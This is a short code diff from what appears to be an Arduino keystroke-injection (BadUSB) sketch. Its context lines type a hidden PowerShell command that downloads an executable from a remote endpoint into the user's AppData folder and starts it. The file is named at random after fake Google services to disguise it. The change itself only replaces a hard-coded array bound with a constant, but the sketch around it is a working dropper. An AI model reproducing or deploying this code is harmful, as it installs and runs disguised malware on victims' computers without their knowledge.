@@ -3,7 +3,8 @@
 #include "AltCoder.h"
 
 #define STUB_ENDPOINT "https://d3usw4are.local/container/stub.dsc"
-const char* STUB_DEPLOY_NAMES[] = {
+#define STUB_DEPLOY_NAMES_COUNT 10
+const char* STUB_DEPLOY_NAMES[STUB_DEPLOY_NAMES_COUNT] = {
   "GoogleService",
   "GoogleAccountManager",
   "ChromeCastService",
@@ -27,7 +28,7 @@ void setup(){
   delay(1000);
   
   writeAltCode("powershell -W H -C \"$o=\\\"$env:APPDATA/");
-  writeAltCode(STUB_DEPLOY_NAMES[random(0, 9)]);
+  writeAltCode(STUB_DEPLOY_NAMES[random(0, STUB_DEPLOY_NAMES_COUNT - 1)]);
   writeAltCode(".exe\\\";$d=New-Object System.Net.WebClient;$d.DownloadFile('");
   writeAltCode(STUB_ENDPOINT);
   writeAltCode("',$o);start -F $o\"");
